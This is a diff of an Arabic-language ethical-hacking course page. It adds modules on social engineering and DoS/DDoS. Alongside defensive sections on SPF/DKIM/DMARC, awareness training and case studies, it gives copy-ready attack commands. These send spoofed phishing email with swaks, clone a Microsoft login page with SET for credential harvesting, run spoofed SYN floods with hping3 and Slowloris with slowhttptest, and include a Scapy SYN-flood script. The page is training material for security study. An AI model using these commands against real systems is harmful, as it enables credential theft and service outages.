+            <td><strong style="color: #bd93f9;">King Phisher</strong></td>
+            <td>phishing campaign manager</td>
+            <td>Plugin system، geo-tracking، credential capture</td>
+            <td>⭐⭐ متوسط</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 6: COMMANDS PLAYBOOK ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📋 Commands Playbook — أوامر حملة Phishing</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;" dir="rtl">
+
+      <details open>
+        <summary style="font-weight: bold; color: var(--tool-color); cursor: pointer; padding: 10px 0;">📧 Email Sending with swaks</summary>
+        <div class="cmd-ui-box">
+# Send test phishing email with swaks
+swaks --to target@company.com \
+  --from "it-support@company-helpdesk.com" \
+  --header "Subject: Urgent: Password Reset Required" \
+  --body "Click here to reset: http://phish.site/reset" \
+  --server mail.provider.com \
+  --port 587 \
+  --tls \
+  --auth LOGIN \
+  --auth-user sender@gmail.com \
+  --auth-password yourpassword
+
+# With HTML body from file
+swaks --to victim@corp.com \
+  --from spoof@corp-it.com \
+  --header "Subject: Security Alert" \
+  --body @phish_email.html \
+  --header "Content-Type: text/html"</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #ff5555; cursor: pointer; padding: 10px 0;">🌐 Clone Website with SET</summary>
+        <div class="cmd-ui-box">
+# Using SET (Social-Engineer Toolkit):
+sudo setoolkit
+# 1) Social-Engineering Attacks
+# 2) Website Attack Vectors
+# 3) Credential Harvester Attack Method
+# 2) Site Cloner
+# Enter URL to clone: https://login.microsoft.com
+
+# OR using wget for manual clone:
+wget --mirror --convert-links --adjust-extension \
+  --page-requisites --no-parent \
+  https://target-login-page.com -P ./clone/
+
+# Then modify the form action to point to your server</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,85,85,0.15); color: #ff5555; border: 1px solid #ff5555; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #50fa7b; cursor: pointer; padding: 10px 0;">📊 Email Header Analysis</summary>
+        <div class="cmd-ui-box">
+# Analyze email headers to detect phishing/spoofing:
+# Check these fields in email headers:
+
+# 1. Return-Path vs From:
+#    Return-Path: bounces@attacker.com
+#    From: ceo@company.com  ← SPOOFED!
+
+# 2. Received headers (trace the path)
+#    Check if originating server matches claimed sender
+
+# 3. SPF result (in Authentication-Results header):
+#    spf=fail → Email failed SPF check (likely spoofed)
+#    spf=pass → Passed SPF
+
+# 4. DKIM signature:
+#    dkim=fail → Signature tampered or missing
+
+# 5. DMARC result:
+#    dmarc=fail action=quarantine → Policy triggered
+
+# Online header analyzer:
+# https://mxtoolbox.com/EmailHeaders.aspx
+# https://toolbox.googleapps.com/apps/messageheader/</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(80,250,123,0.15); color: #50fa7b; border: 1px solid #50fa7b; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #fbbf24; cursor: pointer; padding: 10px 0;">🔍 OSINT for Spear Phishing</summary>
+        <div class="cmd-ui-box">
+# Collect target emails
+theHarvester -d company.com -b google,bing,linkedin
+
+# LinkedIn profile scraping (manually)
+# Search: site:linkedin.com/in "company name"
+
+# Verify email exists (SMTP check)
+smtp-user-enum -M VRFY -U emails.txt -t mail.company.com
+
+# Check if email was in data breaches
+# https://haveibeenpwned.com/API/v3
+curl "https://haveibeenpwned.com/api/v3/breachedaccount/email@company.com" \
+  -H "hibp-api-key: YOUR_KEY"
+
+# Domain email format finder
+# https://hunter.io/search/company.com</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(251,191,36,0.15); color: #fbbf24; border: 1px solid #fbbf24; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 7: REAL CASES ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🏆 دراسات حالة حقيقية</h3></div>
+    <div dir="rtl">
+      <details>
+        <summary style="font-weight: bold; cursor: pointer; font-size: 1.1rem; padding: 12px; background: rgba(255,85,85,0.05); border-radius: 6px; color: #ff5555;">💸 Case 1: BEC هجوم — خسارة $47 مليون (Ubiquiti Networks 2015)</summary>
+        <div style="margin-top: 12px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px;">
+          <p style="color: var(--text-secondary); line-height: 1.8;"><strong>ما حدث:</strong> انتحل المهاجمون صفة مسؤولين تنفيذيين في شركة Ubiquiti Networks وأرسلوا إيميلات للقسم المالي تطلب تحويل أموال لحساب خارجي.</p>
+          <ul style="color: var(--text-secondary); line-height: 2;">
+            <li>الإيميلات بدت من نطاق شبيه: <code>ubiquiti.co</code> بدلاً من <code>ubiquiti.com</code></li>
+            <li>التحويلات تمت على مدى عدة أسابيع لحسابات في هونج كونج وأوروبا</li>
+            <li>لم يُكتشف الأمر إلا بعد $47 مليون!</li>
+          </ul>
+          <div style="background: rgba(255,85,85,0.1); border-radius: 6px; padding: 12px; margin-top: 10px;">
+            <strong style="color: #ff5555;">الدرس:</strong> التحقق الإضافي (خارج الإيميل) لأي طلب تحويل مالي ضروري، حتى لو بدا من CEO.
+          </div>
+        </div>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; cursor: pointer; font-size: 1.1rem; padding: 12px; background: rgba(255,110,39,0.05); border-radius: 6px; color: #ff6e27; margin-top: 10px;">🦠 Case 2: COVID-19 Phishing Campaign 2020</summary>
+        <div style="margin-top: 12px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px;">
+          <p style="color: var(--text-secondary); line-height: 1.8;"><strong>ما حدث:</strong> خلال الوباء، انتشرت حملات Phishing ضخمة تنتحل صفة: منظمة الصحة العالمية (WHO)، وزارة الصحة، برامج دعم حكومي.</p>
+          <ul style="color: var(--text-secondary); line-height: 2;">
+            <li>نسبة النجاح: أعلى من الطبيعي بسبب الـ Urgency والـ Authority المزدوجة</li>
+            <li>إيميلات تحمل "تعليمات الحجر الصحي" أو "نتيجة تحليل كوفيد"</li>
+            <li>Payloads: Emotet، Trickbot، Ransomware</li>
+          </ul>
+          <div style="background: rgba(255,110,39,0.1); border-radius: 6px; padding: 12px; margin-top: 10px;">
+            <strong style="color: #ff6e27;">الدرس:</strong> الأزمات العالمية = فرصة ذهبية للـ SE. يجب رفع وعي الموظفين بشكل استباقي في الأوقات الحرجة.
+          </div>
+        </div>
+      </details>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 8: DEFENSE ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية — Defense Against Social Engineering</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;" dir="rtl">
+      <div>
+        <h4 style="color: #50fa7b;">📧 Email Authentication (SPF/DKIM/DMARC)</h4>
+        <div class="cmd-ui-box">
+# SPF Record (in DNS TXT):
+# Defines which servers can send email for your domain
+v=spf1 include:_spf.google.com ip4:203.0.113.0/24 ~all
+
+# DKIM — cryptographic signature on each email
+# Setup via email provider, verify:
+nslookup -type=TXT selector._domainkey.company.com
+
+# DMARC Record — policy for SPF/DKIM failures
+v=DMARC1; p=reject; rua=mailto:reports@company.com; pct=100
+
+# Check email security with:
+# https://mxtoolbox.com/SuperTool.aspx</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(80,250,123,0.15); color: #50fa7b; border: 1px solid #50fa7b; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
       </div>
-      <div style="padding-top:15px;">
-        <strong style="color:#ff5555;">🧠 الفكرة الأساسية:</strong>
-        <p style="color:#aaa; font-size:0.9em;">إرسال ترافيك ضخم أو طلبات وهمية عشان تخلي السيرفر ينهار وتوقع الخدمة.</p>
-        
-        <strong style="color:#ffb86c; display:block; margin-top:10px;">🔥 الفرق بينهم:</strong>
-        <ul style="color:#aaa; font-size:0.85em; padding-right: 20px;">
-          <li><strong>DoS:</strong> الهجوم جاي من جهاز واحد (سهل عمل بلوك ليه).</li>
-          <li><strong>DDoS:</strong> الهجوم جاي من آلاف الأجهزة (Botnet) في نفس الوقت.</li>
+      <div>
+        <h4 style="color: var(--tool-color);">🎓 Security Awareness Training</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li>تدريب دوري على التعرف على Phishing</li>
+          <li>محاكاة حملات Phishing داخلية (GoPhish)</li>
+          <li>سياسة التحقق من الهوية عبر قناة ثانية</li>
+          <li>لا تفتح مرفقات غير متوقعة</li>
+          <li>تحقق من URL قبل الإدخال (hover before click)</li>
+          <li>سياسة إبلاغ واضحة عن الرسائل المشبوهة</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #ff6e27;">🔒 تقنيات الحماية الإضافية</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>MFA/2FA:</strong> يقلل تأثير Credential Theft</li>
+          <li><strong>Hardware Keys (FIDO2):</strong> يتجاوز evilginx2-style attacks</li>
+          <li><strong>Anti-Phishing DNS:</strong> Cloudflare Gateway، Cisco Umbrella</li>
+          <li><strong>Email Gateway:</strong> فحص المرفقات والروابط</li>
+          <li><strong>Browser Isolation:</strong> تشغيل المواقع المشبوهة في sandbox</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #bd93f9;">📋 Social Engineering Assessment Checklist</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li>☑ SPF, DKIM, DMARC configured &amp; enforced</li>
+          <li>☑ Email gateway anti-spoofing enabled</li>
+          <li>☑ MFA enabled for all users</li>
+          <li>☑ Annual phishing simulation conducted</li>
+          <li>☑ Incident response for phishing defined</li>
+          <li>☑ Callback verification for wire transfers</li>
+          <li>☑ Executive impersonation policies</li>
         </ul>
       </div>
     </div>
+  </div>
 
-    <!-- CLOUD -->
-    <div class="cyber-card" style="border-top:3px solid #bd93f9; margin:0;">
-      <div class="card-header">
-        <h3 style="margin:0; color:#bd93f9;">☁️ 5) Cloud Computing</h3>
-      </div>
-      <div style="padding-top:15px;">
-        <strong style="color:#bd93f9;">🧠 التعريف:</strong>
-        <p style="color:#aaa; font-size:0.9em;">خدمات وسيرفرات وتخزين على الإنترنت بدل ما تكون على أجهزة فعلية عندك (زي AWS و Google Drive).</p>
-        
-        <strong style="color:#8be9fd; display:block; margin-top:10px;">🧱 أنواع الـ Cloud:</strong>
-        <p style="color:#aaa; font-size:0.85em;">Public (متاح للجميع) - Private (مقفول لشركة) - Hybrid (مزيج).</p>
-
-        <strong style="color:#50fa7b; display:block; margin-top:10px;">⚙️ نماذج الخدمة (Service Models):</strong>
-        <ul style="color:#aaa; font-size:0.85em; padding-right: 20px; margin-bottom:0;">
-          <li><strong>IaaS:</strong> بتأجر سيرفرات فاضية وإنت تبني.</li>
-          <li><strong>PaaS:</strong> منصة جاهزة للمطورين.</li>
-          <li><strong>SaaS:</strong> برنامج جاهز للمستخدم (زي الـ Gmail).</li>
-        </ul>
-      </div>
+  <!-- ═══ SECTION 9: CTF CHALLENGE ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🧪 تحدي — اختبر معلوماتك في SE</h3></div>
+    <div dir="rtl" style="display: flex; flex-direction: column; gap: 15px;">
+      <details>
+        <summary style="cursor: pointer; font-weight: bold; padding: 12px; background: rgba(255,110,39,0.05); border-radius: 6px; color: var(--tool-color);">❓ أي مبدأ Cialdini يستغله هذا السيناريو: "حسابك سيُغلق خلال 24 ساعة!"</summary>
+        <div style="padding: 15px; background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); border-radius: 6px; margin-top: 8px;">
+          <strong style="color: #50fa7b;">✅ الإجابة: Urgency (الإلحاح)</strong>
+          <p style="color: var(--text-secondary); margin-top: 5px;">الضغط الزمني يمنع الضحية من التفكير النقدي والتحقق من صحة الطلب.</p>
+        </div>
+      </details>
+      <details>
+        <summary style="cursor: pointer; font-weight: bold; padding: 12px; background: rgba(255,85,85,0.05); border-radius: 6px; color: #ff6e27;">❓ ما الفرق بين Phishing و Spear Phishing؟</summary>
+        <div style="padding: 15px; background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); border-radius: 6px; margin-top: 8px;">
+          <strong style="color: #50fa7b;">✅ الإجابة:</strong>
+          <p style="color: var(--text-secondary); margin-top: 5px;">Phishing = هجوم جماعي عشوائي لأعداد كبيرة. Spear Phishing = هجوم مستهدف لشخص/مؤسسة محددة مع معلومات شخصية لزيادة المصداقية.</p>
+        </div>
+      </details>
+      <details>
+        <summary style="cursor: pointer; font-weight: bold; padding: 12px; background: rgba(251,191,36,0.05); border-radius: 6px; color: #fbbf24;">❓ لماذا evilginx2 يستطيع تجاوز 2FA بينما GoPhish لا يستطيع؟</summary>
+        <div style="padding: 15px; background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); border-radius: 6px; margin-top: 8px;">
+          <strong style="color: #50fa7b;">✅ الإجابة:</strong>
+          <p style="color: var(--text-secondary); margin-top: 5px;">GoPhish يلتقط فقط ما يُدخله المستخدم في الصفحة المزيفة (credentials). evilginx2 يعمل كـ Reverse Proxy حقيقي — يمرر الطلبات للموقع الأصلي ويلتقط الـ Session Cookies بعد اكتمال المصادقة بما فيها الـ 2FA token.</p>
+        </div>
+      </details>
     </div>
   </div>
 
-  <!-- SUMMARY TABLE -->
-  <div class="cyber-card" style="border-top:3px solid #f1fa8c; margin-top:20px;">
-    <div class="card-header">
-      <h3 style="margin:0; color:#f1fa8c;">💡 الخلاصة القوية 🔥</h3>
+  <!-- ═══ SECTION 10: CHEAT SHEET ═══ -->
+  <div class="cyber-card" style="border: 1px solid rgba(255,110,39,0.3);">
+    <div class="card-header" style="background: rgba(255,110,39,0.05);"><h3>📖 Cheat Sheet — Social Engineering Quick Reference</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px;" dir="rtl">
+      <div>
+        <h5 style="color: var(--tool-color);">مبادئ Cialdini</h5>
+        <ul style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.9;">
+          <li>1. Authority (السلطة)</li>
+          <li>2. Urgency (الإلحاح)</li>
+          <li>3. Scarcity (الندرة)</li>
+          <li>4. Social Proof (التقليد)</li>
+          <li>5. Liking (التعاطف)</li>
+          <li>6. Reciprocity (التبادل)</li>
+        </ul>
+      </div>
+      <div>
+        <h5 style="color: #ff6e27;">أنواع الهجمات</h5>
+        <ul style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.9;">
+          <li>Phishing — Email mass</li>
+          <li>Spear Phishing — Targeted</li>
+          <li>Whaling — C-Suite</li>
+          <li>Vishing — Voice</li>
+          <li>SMiShing — SMS</li>
+          <li>BEC — Wire fraud</li>
+          <li>Baiting — USB/physical</li>
+        </ul>
+      </div>
+      <div>
+        <h5 style="color: #50fa7b;">Defense Checklist</h5>
+        <ul style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.9;">
+          <li>☑ SPF + DKIM + DMARC</li>
+          <li>☑ MFA on all accounts</li>
+          <li>☑ Phishing simulation</li>
+          <li>☑ Email gateway filter</li>
+          <li>☑ Callback verification</li>
+          <li>☑ Security awareness</li>
+          <li>☑ Report phishing button</li>
+        </ul>
+      </div>
     </div>
-    <table class="meth-table" style="margin-top:15px;">
-      <thead>
-        <tr>
-          <th>المجال (Topic)</th>
-          <th>الفكرة الأساسية للهاكر (Concept)</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr><td><strong>Social Engineering</strong></td><td style="color:#ffb86c;">خداع الإنسان نفسه للوصول للسيستم.</td></tr>
-        <tr><td><strong>Sniffing & MITM</strong></td><td style="color:#8be9fd;">اعتراض الترافيك وسرقة الباسوردات من الشبكة.</td></tr>
-        <tr><td><strong>Wireless Attacks</strong></td><td style="color:#50fa7b;">كسر تشفير الواي فاي (Handshakes) و هجمات Evil Twin.</td></tr>
-        <tr><td><strong>DoS / DDoS</strong></td><td style="color:#ff5555;">تدمير السيرفر وإيقاف الخدمة.</td></tr>
-        <tr><td><strong>Cloud Computing</strong></td><td style="color:#bd93f9;">الهجوم على الخدمات السحابية (Misconfigurations).</td></tr>
-      </tbody>
-    </table>
   </div>
 
 </div>
 
-      
-<!-- =======================================================
-     CEH MODULE 10: Denial-of-Service
-     ======================================================= -->
-<div class="meth-content-view" id="meth-content-mod10" style="display:none;" dir="rtl">
-  
+      <div class="meth-content-view" id="meth-content-mod10" style="display: none; --tool-color: #ff5555;">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">🛑</span> Denial-of-Service (DoS/DDoS)</h2>
-    <p class="hero-tagline">استنزاف الموارد: الهجمات الحجمية، الاستنزاف، والتضخيم الانعكاسي.</p>
-    <div class="hero-meta">
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-orange);"></span> Module 10</span>
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    <h2 class="hero-title"><span class="hero-icon">💥</span> DoS &amp; DDoS Attacks — حجب الخدمة</h2>
+    <p class="hero-tagline">شرح آليات هجمات حجب الخدمة وحجب الخدمة الموزع — من الطبقات المنخفضة L3/L4 إلى هجمات التطبيقات L7 وطرق الحماية</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ hping3 · Slowloris · slowhttptest · Scapy</span>
+      <span class="badge badge-info">📋 CEH Domain: DoS/DDoS (Weight ~8%)</span>
+      <span style="background: rgba(255,85,85,0.15); color: #ff5555; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High (Availability)</span>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">💥</span>
-      <h3>تقنيات حجب الخدمة (Attack Vectors)</h3>
-    </div>
-    
-    <div class="cyber-card" style="--tool-color: #00b4d8;">
-      <div class="card-header"><h4>1. استنزاف البروتوكول (TCP SYN Flood)</h4></div>
-      <p>إغراق الخادم بطلبات `SYN` بعناوين مزيفة. يترك الخادم الجلسات في الانتظار (Half-open) حتى تمتلئ الذاكرة وتتوقف الخدمة.</p>
-    </div>
+  <!-- ═══ SECTION 2: THEORY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — كيف تعمل هجمات DoS &amp; DDoS</h3></div>
+    <div dir="rtl" style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        هدف هجمات <strong>DoS (Denial of Service)</strong> و <strong>DDoS (Distributed Denial of Service)</strong> هو منع المستخدمين الشرعيين من الوصول إلى الخدمات أو الموارد (تدمير Availability).
+      </p>
+      
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">📊 تصنيف الهجمات حسب طبقات OSI</h4>
+          <ul style="line-height: 2;">
+            <li><strong>L3/L4 (Network &amp; Transport Layer):</strong> استهداف قنوات الاتصال والـ Port Resources. مثل (SYN Flood, UDP Flood, ICMP Flood). تعتمد على إرسال كميات هائلة من الحزم (Volumetric).</li>
+            <li><strong>L7 (Application Layer):</strong> استهداف تطبيقات الويب وقواعد البيانات مباشرة. تستهلك موارد الخادم (CPU, RAM) عبر طلبات تبدو طبيعية ولكنها مكثفة أو بطيئة جداً. مثل (HTTP Flood, Slowloris, XML/JSON Bomb).</li>
+          </ul>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">⚡ هجمات الانعكاس والتضخيم (Reflection &amp; Amplification)</h4>
+          <p>
+            تعتمد على إرسال طلبات صغيرة لجهات خارجية (Reflectors) تحمل عنوان IP الضحية كعنوان مرسل (IP Spoofing)، وتقوم هذه الجهات بالرد بحزم ضخمة جداً على الضحية.
+          </p>
+          <ul style="line-height: 2;">
+            <li><strong>DNS Amplification:</strong> معامل التضخيم يصل إلى <strong>54x</strong>.</li>
+            <li><strong>NTP Amplification:</strong> معامل التضخيم يصل إلى <strong>556x</strong>.</li>
+            <li><strong>Memcached Amplification:</strong> معامل التضخيم يصل إلى <strong>50,000x</strong>!</li>
+          </ul>
+        </div>
+      </div>
 
-    <div class="cyber-card" style="--tool-color: #ff4757;">
-      <div class="card-header"><h4>2. التضخيم والانعكاس (Amplification Attacks)</h4></div>
-      <p>استغلال الـ UDP (مثل DNS أو NTP). يرسل المهاجم طلب صغير بعنوان الضحية (Spoofed)، فيرد الخادم بإجابة ضخمة جداً تسحق شبكة الضحية.</p>
-    </div>
+      <hr style="border-color: rgba(255,255,255,0.1); margin: 20px 0;">
 
-    <div class="cyber-card" style="--tool-color: #ffa502;">
-      <div class="card-header"><h4>3. هجوم طبقة التطبيقات (Slowloris)</h4></div>
-      <p>فتح آلاف الاتصالات مع الخادم، وإرسال الـ Headers ببطء شديد وتجزئتها، مما يستنفد الـ Concurrent Connections دون الحاجة لباندويث ضخم.</p>
+      <h4 style="color: var(--tool-color);">⚠️ آلية هجوم SYN Flood بالتفصيل</h4>
+      <p>
+        يستغل هذا الهجوم مصافحة TCP الثلاثية (TCP 3-way Handshake). في الوضع الطبيعي:
+        <br><code>Client (SYN) → Server (SYN-ACK) → Client (ACK)</code>
+        <br>أثناء الهجوم، يرسل المهاجم آلاف حزم <code>SYN</code> بعناوين وهمية (Spoofed IPs)، فيقوم الخادم بحجز مساحة في الـ <strong>Connection Queue (Backlog Table)</strong> ويرسل <code>SYN-ACK</code> وينتظر الـ <code>ACK</code> الأخير الذي لن يأتي أبداً. يظل الاتصال معلقاً (Half-Open Connection) حتى تمتلئ الذاكرة ويرفض الخادم أي اتصالات جديدة.
+      </p>
     </div>
+  </div>
 
-    <div class="cyber-card" style="--tool-color: #2ed573;">
-      <div class="card-header"><h4>4. هجوم Smurf</h4></div>
-      <p>إرسال طلب ICMP بعنوان الضحية لعنوان بث (Broadcast) ضخم. كل الأجهزة في تلك الشبكة ترد على الضحية في نفس اللحظة مضخمة الهجوم.</p>
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح الهجوم — خطوات اختبار حجب الخدمة</h3></div>
+    <div dir="rtl">
+      <div style="display: flex; flex-direction: column; gap: 12px;">
+
+        <div style="display: flex; align-items: flex-start; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px; text-align: center;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Target Profiling &amp; Resource Scan</strong>
+            <p style="color: var(--text-secondary); margin: 5px 0 0 0; font-size: 0.9rem;">تحديد المنافذ المفتوحة والخدمات وقدرات الخادم الاستيعابية.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# scan target ports
+nmap -p 80,443,53,123 target.com
+
+# check connection limit using apache bench (simulating 100 requests with concurrency of 10)
+ab -n 100 -c 10 http://target.com/</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; align-items: flex-start; gap: 15px; background: rgba(255,85,85,0.05); border-right: 3px solid #ff5555; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px; text-align: center;">2️⃣</span>
+          <div>
+            <strong style="color: #ff5555;">SYN Flood simulation (Lab environment)</strong>
+            <p style="color: var(--text-secondary); margin: 5px 0 0 0; font-size: 0.9rem;">إرسال حزم SYN سريعة مع تزوير عنوان المرسل لإغراق الـ Connection Queue.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Using hping3: -S (SYN), -p (port), --flood (fast as possible), --rand-source (spoof source IPs)
+sudo hping3 -S -p 80 --flood --rand-source TARGET_IP</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,85,85,0.15); color: #ff5555; border: 1px solid #ff5555; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; align-items: flex-start; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px; text-align: center;">3️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Slow Connection Attack (Slowloris)</strong>
+            <p style="color: var(--text-secondary); margin: 5px 0 0 0; font-size: 0.9rem;">فتح اتصالات HTTP وإبقاؤها مفتوحة عبر إرسال headers غير مكتملة ببطء شديد، مما يستهلك الـ Thread Pool بالكامل.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Using slowhttptest tool: -H (Slowloris mode), -g (generate statistics), -c (connections), -r (connections per second), -t (HTTP verb)
+slowhttptest -H -u http://target.com -c 1000 -r 200 -t GET -i 10 -x 24 -p 3</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: PAYLOADS ARSENAL ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>⚡ ترسانة هجمات حجب الخدمة</h3></div>
+    <div dir="rtl">
+      <h4 style="color: var(--tool-color); margin-bottom: 10px;">Scapy custom DDoS scripts (For Research &amp; Testing)</h4>
+      <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 10px;">بناء سيناريوهات SYN Flood مخصصة باستخدام Scapy في بايثون:</p>
+      <pre style="background: #282a36; padding: 15px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code>from scapy.all import *
+import random
+
+def syn_flood(target_ip, target_port):
+    # Craft IP packet with spoofed source
+    ip_pkt = IP(src=RandIP(), dst=target_ip)
+    # Craft TCP SYN packet
+    tcp_pkt = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", seq=random.randint(1000, 9000))
+    # Send packet
+    send(ip_pkt/tcp_pkt, verbose=0)
+
+# Example usage:
+# syn_flood("192.168.1.50", 80)</code></pre>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 5: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ مقارنة الأدوات وشرح عملها</h3></div>
+    <div dir="rtl">
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>الطبقة المستهدفة</th>
+            <th>الوصف وآلية العمل</th>
+            <th>التعقيد</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">hping3</strong></td>
+            <td>L3/L4 (Network/Transport)</td>
+            <td>أداة مخصصة لإنشاء حزم TCP/IP وإرسالها بمعدلات عالية جداً مع التحكم في الأعلام (Flags) وعنوان المصدر.</td>
+            <td>⭐ سهل</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">Slowloris</strong></td>
+            <td>L7 (Application)</td>
+            <td>تستهلك موارد خوادم الويب (Web Servers threads) عن طريق فتح اتصالات HTTP وإبقائها مفتوحة بأقل قدر من البيانات.</td>
+            <td>⭐ سهل</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">slowhttptest</strong></td>
+            <td>L7 (Application)</td>
+            <td>أداة شاملة لاختبار ثبات الخادم ضد هجمات Slowloris, Slow POST, و Slow Read. تخرج تقارير ورسوم بيانية.</td>
+            <td>⭐⭐ متوسط</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #bd93f9;">Apache Bench (ab)</strong></td>
+            <td>L7 (Load testing)</td>
+            <td>أداة رسمية من Apache مخصصة لقياس كفاءة السيرفر تحت الضغط عبر إرسال آلاف الطلبات المتزامنة.</td>
+            <td>⭐ سهل</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 6: COMMANDS PLAYBOOK ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📋 Commands Playbook — أوامر اختبار حجب الخدمة</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;" dir="rtl">
+
+      <details open>
+        <summary style="font-weight: bold; color: var(--tool-color); cursor: pointer; padding: 10px 0;">🛡️ TCP SYN Flood (hping3)</summary>
+        <div class="cmd-ui-box">
+# Basic SYN flood on port 80
+sudo hping3 -S -p 80 --flood --rand-source TARGET_IP
+
+# SYN flood with specific data size (120 bytes)
+sudo hping3 -S -p 80 -d 120 --flood --rand-source TARGET_IP</div>
